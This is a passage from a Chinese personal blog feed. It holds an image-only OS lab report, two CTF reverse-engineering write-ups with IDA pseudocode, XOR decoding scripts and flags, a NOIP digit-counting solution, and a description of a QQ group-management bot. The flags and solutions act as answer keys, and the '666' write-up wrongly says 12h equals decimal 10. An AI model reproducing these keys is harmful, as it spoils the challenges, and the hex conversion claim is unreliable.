                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605191450333.png"
                      alt="image-20240605191450333"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605191516148.png"
                      alt="image-20240605191516148"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605191741413.png"
                      alt="image-20240605191741413"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605191937304.png"
                      alt="image-20240605191937304"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605192109822.png"
                      alt="image-20240605192109822"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605192316158.png"
                      alt="image-20240605192316158"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605192456522.png"
                      alt="image-20240605192456522"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605192524414.png"
                      alt="image-20240605192524414"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605192659116.png"
                      alt="image-20240605192659116"
                ></p>
<h2 id="编辑-sys-h、unistd-h"><a href="#编辑-sys-h、unistd-h" class="headerlink" title="编辑 sys.h、unistd.h"></a>编辑 sys.h、unistd.h</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605193011602.png"
                      alt="image-20240605193011602"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605193115647.png"
                      alt="image-20240605193115647"
                ></p>
<h2 id="编辑-system-call-s"><a href="#编辑-system-call-s" class="headerlink" title="编辑 system_call.s"></a>编辑 system_call.s</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605193207076.png"
                      alt="image-20240605193207076"
                ></p>
<h2 id="创建编辑-shm-c"><a href="#创建编辑-shm-c" class="headerlink" title="创建编辑 shm.c"></a>创建编辑 shm.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605193617716.png"
                      alt="image-20240605193617716"
                ></p>
<h2 id="编辑-MakeFile"><a href="#编辑-MakeFile" class="headerlink" title="编辑 MakeFile"></a>编辑 MakeFile</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605193816641.png"
                      alt="image-20240605193816641"
                ></p>
<h2 id="编辑-sem-h"><a href="#编辑-sem-h" class="headerlink" title="编辑 sem.h"></a>编辑 sem.h</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605193941230.png"
                      alt="image-20240605193941230"
                ></p>
<h2 id="创建-producer-c、consumer-c"><a href="#创建-producer-c、consumer-c" class="headerlink" title="创建 producer.c、consumer.c"></a>创建 producer.c、consumer.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605194339080.png"
                      alt="image-20240605194339080"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605194356457.png"
                      alt="image-20240605194356457"
                ></p>
<h2 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605194516837.png"
                      alt="image-20240605194516837"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605194541745.png"
                      alt="image-20240605194541745"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605194601253.png"
                      alt="image-20240605194601253"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605194800364.png"
                      alt="image-20240605194800364"
                ></p>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>操作系统</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>QFNU</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-Reverse-666writeup</title>
    <url>/posts/117d354d.html</url>
    <content><![CDATA[<h1 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h1><p>丢进去查壳</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/08/26/gAGTtvBK.png"
                      alt="1.png"
                ></p>
<p>无壳</p>
<h1 id="进入IDA"><a href="#进入IDA" class="headerlink" title="进入IDA"></a>进入IDA</h1><p>直接拉进ida</p>
<p> 首先看到一个比较醒目的flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/08/26/GF6BzP2T.png"
                      alt="2.png"
                ></p>
<p>但是这怎么可能就是答案呢</p>
<h1 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h1><p>看一下主函数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/08/26/HaTlGnfa.png"
                      alt="3.png"
                ></p>
<p>双击enflag看一下<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/08/26/7RilNm8M.png"
                      alt="4.png"
                ></p>
<p> 发现enflag是izwhroz””w”v.K”.Ni</p>
<p>转化为十进制<a class="link"   href="https://www.rapidtables.org/zh-CN/convert/number/ascii-hex-bin-dec-converter.html" >ASCII文本，十六进制，二进制，十进制，Base64转换器 (rapidtables.org)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">[<span class="number">105</span>,<span class="number">122</span>,<span class="number">119</span>,<span class="number">104</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">122</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">119</span>,<span class="number">34</span>,<span class="number">118</span>,<span class="number">46</span>,<span class="number">75</span>,<span class="number">34</span>,<span class="number">46</span>,<span class="number">78</span>,<span class="number">105</span>]</span><br></pre></td></tr></table></figure></div>

<p>key的长度是12h（注意是16进制），转换成十进制应该是10</p>
<h1 id="encode函数"><a href="#encode函数" class="headerlink" title="encode函数"></a>encode函数</h1><p>返回主函数看一下encode是干啥的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/08/26/axSEUavG.png"
                      alt="5.png"
                ></p>
<p> 根据三行重点计算过程，写一下逆向代码</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string v3=<span class="string">&quot;&quot;</span>; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; enflag = &#123; <span class="number">105</span>,<span class="number">122</span>,<span class="number">119</span>,<span class="number">104</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">122</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">119</span>,<span class="number">34</span>,<span class="number">118</span>,<span class="number">46</span>,<span class="number">75</span>,<span class="number">34</span>,<span class="number">46</span>,<span class="number">78</span>,<span class="number">105</span>,<span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i += <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v3 += <span class="built_in">char</span>((<span class="number">18</span> ^ enflag[i]) - <span class="number">6</span>);</span><br><span class="line">        v3 += <span class="built_in">char</span>((<span class="number">18</span> ^ enflag[i + <span class="number">1</span>]) + <span class="number">6</span>);</span><br><span class="line">        v3 += <span class="built_in">char</span>(<span class="number">18</span> ^ enflag[i + <span class="number">2</span>] ^ <span class="number">6</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; v3 &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>unctf{b66_6b6_66b}</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
        <category>RE</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-Reverse-easyxorwriteup</title>
    <url>/posts/c57101a0.html</url>
    <content><![CDATA[<h1 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h1><p>无壳</p>
<h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><p>拉进漂亮姐姐中（IDA）</p>
<p>shift+F12看一下字串</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://z1.ax1x.com/2023/09/16/pPfDEYF.jpg"
                     
                ></p>
<p>首先看到一个关键信息，点进去，Ctrl+x交叉引用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://z1.ax1x.com/2023/09/16/pPfDVW4.jpg"
                     
                ></p>
<p>F5看一下伪代码</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+33h] [rbp-Dh]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+33h] [rbp-Dh]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">	v7 = key[v9 % <span class="number">4</span>] ^ v8;			<span class="comment">//输入的字符，进行异或操作，得到v7</span></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )						</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v7--;					<span class="comment">//循环v7次</span></span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt;= <span class="number">0</span> )				<span class="comment">//此while循环是向s[]中输入v7个1</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = v11++;</span><br><span class="line">      s[v3] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = v11++;						<span class="comment">//输出v7个1后，使用0与下一串1隔开	</span></span><br><span class="line">    s[v5] = <span class="number">0</span>;						</span><br><span class="line">    ++v9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v11 &lt;= <span class="number">2559</span> )				<span class="comment">//输入的字符全部转化为1之后，不够2559个的话填充-1（255）</span></span><br><span class="line">    s[v11++] = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2559</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( r[i] != s[i] )				<span class="comment">//进行比较</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Lose lose lose!&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">2560</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Win win win!&quot;</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中r是</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">r = [0x35, 0x2F, 0x2F, 0x32, 0x28, 0x14, 0x27, 0x3B, 0x3D, 0x70,</span><br><span class="line">     0x3C, 0x0A, 0x3D, 0x73, 0x3A, 0x0A, 0x1F, 0x73, 0x3D, 0x66,</span><br><span class="line">     0x21, 0x1C, 0x6D, 0x28]</span><br></pre></td></tr></table></figure></div>

<p>key是SCNU</p>
<h1 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h1><p>写一下解密python</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">r = [<span class="number">0x35</span>, <span class="number">0x2F</span>, <span class="number">0x2F</span>, <span class="number">0x32</span>, <span class="number">0x28</span>, <span class="number">0x14</span>, <span class="number">0x27</span>, <span class="number">0x3B</span>, <span class="number">0x3D</span>, <span class="number">0x70</span>,</span><br><span class="line">     <span class="number">0x3C</span>, <span class="number">0x0A</span>, <span class="number">0x3D</span>, <span class="number">0x73</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x1F</span>, <span class="number">0x73</span>, <span class="number">0x3D</span>, <span class="number">0x66</span>,</span><br><span class="line">     <span class="number">0x21</span>, <span class="number">0x1C</span>, <span class="number">0x6D</span>, <span class="number">0x28</span>]</span><br><span class="line">key = <span class="string">&quot;SCNU&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(r)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(key[i % <span class="number">4</span>]) ^ r[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>

<h1 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h1><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Winn3r_n0t_L0s3r_#&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
        <category>RE</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>数字统计</title>
    <url>/posts/2e9ca8cf.html</url>
    <content><![CDATA[<h1 id="NOIP2010-普及组-数字统计"><a href="#NOIP2010-普及组-数字统计" class="headerlink" title="[NOIP2010 普及组] 数字统计"></a>[NOIP2010 普及组] 数字统计</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>请统计某个给定范围 $[L, R]$ 的所有整数中，数字 $2$ 出现的次数。</p>
<p>比如给定范围 $[2, 22]$，数字 $2$ 在数 $2$ 中出现了 $1$ 次，在数 $12$ 中出现 $1$ 次，在数 $20$ 中出现 $1$ 次，在数 $21$ 中出现 $1$ 次，在数 $22$ 中出现 $2$ 次，所以数字 $2$ 在该范围内一共出现了 $6$ 次。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>$2$ 个正整数 $L$ 和 $R$，之间用一个空格隔开。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>数字 $2$ 出现的次数。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 22</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure></div>

<h2 id="样例-2"><a href="#样例-2" class="headerlink" title="样例 #2"></a>样例 #2</h2><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入 #2"></a>样例输入 #2</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 100</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出 #2"></a>样例输出 #2</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">20</span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>$1 ≤ L ≤R≤ 100000$。</p>
<p>NOIP2010 普及组 第一题</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">a, b = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a, b + <span class="number">1</span>):</span><br><span class="line">    i_str = <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i_str:</span><br><span class="line">        num_str = <span class="built_in">int</span>(j)</span><br><span class="line">        <span class="keyword">if</span> num_str == <span class="number">2</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(count)</span><br></pre></td></tr></table></figure></div>



<h2 id="题解解释"><a href="#题解解释" class="headerlink" title="题解解释"></a>题解解释</h2><p>这段代码实现了统计给定范围 $[a, b]$ 中数字 $2$ 出现的次数。首先通过 <code>input().split()</code> 获取用户输入的两个整数，然后通过 <code>map(int, ...)</code> 将输入的字符串转换为整数，并将其分别赋值给变量 <code>a</code> 和 <code>b</code>。接着初始化计数变量 <code>count</code> 为 $0$。</p>
<p>然后通过 <code>for i in range(a, b + 1):</code> 循环遍历范围 $[a, b]$ 中的每一个整数。在循环中，将当前整数 <code>i</code> 转换为字符串 <code>i_str</code>，然后通过 <code>for j in i_str:</code> 遍历该字符串的每一位数字。将每一位数字转换为整数 <code>num_str</code>，如果 <code>num_str</code> 等于 $2$，则将 <code>count</code> 自增 $1$。</p>
<p>最后输出 <code>count</code>，即范围 $[a, b]$ 中数字 $2$ 出现的总次数。</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="提取整数中每一个数字"><a href="#提取整数中每一个数字" class="headerlink" title="提取整数中每一个数字"></a>提取整数中每一个数字</h3><p>要提取一个整数中的每一位数字，你可以使用 Python 将其转换为字符串，然后逐个访问每个字符。下面是一个简单的示例：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extract_digits</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="comment"># 将数字转换为字符串</span></span><br><span class="line">    number_str = <span class="built_in">str</span>(number)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历字符串中的每个字符</span></span><br><span class="line">    <span class="keyword">for</span> digit_char <span class="keyword">in</span> number_str:</span><br><span class="line">        <span class="comment"># 如果字符是数字字符，则转换为整数并打印</span></span><br><span class="line">        <span class="keyword">if</span> digit_char.isdigit():</span><br><span class="line">            digit = <span class="built_in">int</span>(digit_char)</span><br><span class="line">            <span class="built_in">print</span>(digit)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数并传入整数</span></span><br><span class="line">extract_digits(<span class="number">123456</span>)</span><br></pre></td></tr></table></figure></div>

<p>这将输出：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td></tr></table></figure></div>

<p>这里我们将整数转换为字符串，然后遍历字符串的每个字符，将每个字符再转换回整数以获取每一位数字。</p>
<h3 id="chr-和-str-函数，我搞混了"><a href="#chr-和-str-函数，我搞混了" class="headerlink" title="chr 和 str 函数，我搞混了"></a>chr 和 str 函数，我搞混了</h3><p>还要注意 chr 和 str 函数，我搞混了</p>
<p>在 Python 中，<code>chr()</code> 和 <code>str()</code> 是两个不同的函数，用途也不同。</p>
<ol>
<li><code>chr()</code>: 这个函数接受一个整数参数，并返回对应的 ASCII 或 Unicode 字符。例如，<code>chr(65)</code> 将返回字符’A’，<code>chr(97)</code> 将返回字符’a’。</li>
</ol>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">65</span>))  <span class="comment"># 输出: A</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">97</span>))  <span class="comment"># 输出: a</span></span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li><code>str()</code>: 这个函数用于将对象转换为字符串。它可以接受任何类型的参数，并返回其字符串表示形式。对于数字，它会将数字转换为相应的字符串；对于其他对象，它会调用对象的 <code>__str__()</code> 方法来获取字符串表示形式。</li>
</ol>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(<span class="number">65</span>))  <span class="comment"># 输出: &#x27;65&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(<span class="number">3.14</span>))  <span class="comment"># 输出: &#x27;3.14&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]))  <span class="comment"># 输出: &#x27;[1, 2, 3]&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>所以，<code>chr()</code> 函数是将整数转换为字符，而 <code>str()</code> 函数是将任意对象转换为字符串。</p>
]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>数据挖掘实验1——Python环境搭建及基础练习</title>
    <url>/posts/45db3590.html</url>
    <content><![CDATA[<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-80296acae072f8cbe64a998d3427cd80.webp"
                      alt="img"
                ></p>
<h3 id="配置镜像源"><a href="#配置镜像源" class="headerlink" title="配置镜像源"></a>配置镜像源</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-4580204c8c235148c3463805f6ad3d5e.webp"
                      alt="img"
                ></p>
<p>我一般直接是挂代理安装 pip 包，这里防止我本地环境搞乱不配置了，上面是 conda 的信息</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>有现成的自己暑假写的项目，直接交了。</p>
<p>基于 Python 和 OneBot 11 的 QQ 机器人实现</p>
<p>开源地址：<a class="link"   href="https://github.com/W1ndys-bot/W1ndys-bot" >W1ndys-bot&#x2F;W1ndys-bot: 基于 Python 和 OneBot 11 的 QQ 机器人实现 (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>解释一下代码结构</p>
<p>根目录是放的一些常用的批处理脚本、docker-compose 索引文件、Git 配置文件、以及 pip 环境依赖索引文件</p>
<p>核心代码在 app 路径之下</p>
<ul>
<li><code>app/main.py</code> 是程序入口，是启动文件</li>
<li><code>app/menu.py</code> 是菜单文件</li>
<li><code>app/secret.py</code> 是秘钥存放文件</li>
<li><code>app/switch.py</code> 是开关文件</li>
<li><code>app/config.py</code> 是配置文件</li>
<li><code>app/bot.py</code> 是机器人接收消息的核心代码</li>
<li><code>app/data</code> 是数据存放目录</li>
<li><code>app/hanndle_event.py</code> 是处理事件的核心代码</li>
<li><code>app/scripts</code> 是所有功能模块的存放目录</li>
<li><code>app/api.py</code> 是所有 API 的存放目录</li>
</ul>
<h3 id="功能演示"><a href="#功能演示" class="headerlink" title="功能演示"></a>功能演示</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-7c59acaed28397bac321d0bfccb393f4.webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-569b1158c55ee1d047013ef15303415e.webp"
                      alt="img"
                ></p>
<h2 id="代码已实现功能"><a href="#代码已实现功能" class="headerlink" title="代码已实现功能"></a>代码已实现功能</h2><h3 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h3><ul>
<li>机器人连接成功通知到 root 管理员 QQ</li>
<li>机器人断开通知到钉钉</li>
<li>机器人断线自动重连</li>
<li>菜单</li>
</ul>
<h3 id="群发消息"><a href="#群发消息" class="headerlink" title="群发消息"></a>群发消息</h3><blockquote>
<p>群发消息，私聊 bot</p>
</blockquote>
<ul>
<li>群发消息</li>
<li>添加群</li>
<li>删除群</li>
<li>查看群</li>
</ul>
<h3 id="群管系统"><a href="#群管系统" class="headerlink" title="群管系统"></a>群管系统</h3><ul>
<li>禁言</li>
<li>禁言自己</li>
<li>禁言指定用户</li>
<li>禁言随机用户</li>
<li>禁言指定用户指定秒</li>
<li>禁言随机用户随机秒</li>
<li>解禁</li>
<li>踢人</li>
<li>撤回消息</li>
<li>撤回指定消息</li>
<li>扫描邀请链</li>
<li>添加违禁词</li>
<li>移除违禁词</li>
<li>列出违禁词</li>
<li>启用违禁词检测</li>
<li>禁用违禁词检测</li>
<li>启用入群欢迎信息</li>
<li>禁用入群欢迎信息</li>
<li>启用邀请链功能</li>
<li>禁用邀请链功能</li>
<li>查看邀请链</li>
</ul>
<h3 id="邀请链记录"><a href="#邀请链记录" class="headerlink" title="邀请链记录"></a>邀请链记录</h3><blockquote>
<p>记录用户通过邀请链进入群聊的情况，并记录用户 QQ 号和入群时间，当有群内广告时，可以递归遍历邀请链，找到所有相关用户，不仅可以搜父子关系，还可以搜兄弟关系</p>
<p>例如：A 邀请 B 进入群聊，B 又邀请 C 进入群聊，C 又邀请 D 进入群聊，那么邀请链就是 A -&gt; B -&gt; C -&gt; D</p>
<p>再例如：A 邀请 B 和 C，B 邀请 D，C 邀请 E，那么邀请链就是 A -&gt; B -&gt; D 和 A -&gt; C -&gt; E，当 E 发送了违规广告时，可以递归遍历邀请链，找到 A、B、C、D、E 所有相关用户</p>
</blockquote>
<ul>
<li>开启邀请链记录</li>
<li>关闭邀请链记录</li>
<li>查看邀请链记录</li>
</ul>
<h3 id="黑名单系统"><a href="#黑名单系统" class="headerlink" title="黑名单系统"></a>黑名单系统</h3><blockquote>
<p>黑名单系统，可以对指定用户进行拉黑，拉黑后，用户将会被踢出群聊，并且拒绝该用户再次进入群聊</p>
<p>支持艾特添加，支持 QQ 号添加</p>
</blockquote>
<ul>
<li>添加黑名单</li>
<li>删除黑名单</li>
<li>列出黑名单</li>
<li>禁用黑名单</li>
<li>启用黑名单</li>
</ul>
<h3 id="群名片锁"><a href="#群名片锁" class="headerlink" title="群名片锁"></a>群名片锁</h3><blockquote>
<p>群名片锁，可以对指定用户进行群名片锁定，锁定后，用户将会被锁定在当前群名片，若发现用户修改群名片，将会重新锁定</p>
</blockquote>
<ul>
<li>修改群名片</li>
<li>添加群名片锁</li>
<li>删除群名片锁</li>
<li>禁用群名片锁</li>
<li>启用群名片锁</li>
</ul>
<h3 id="软封禁系统"><a href="#软封禁系统" class="headerlink" title="软封禁系统"></a>软封禁系统</h3><blockquote>
<p>指不禁言，但是会撤回每条消息</p>
</blockquote>
<ul>
<li>添加软封禁</li>
<li>删除软封禁</li>
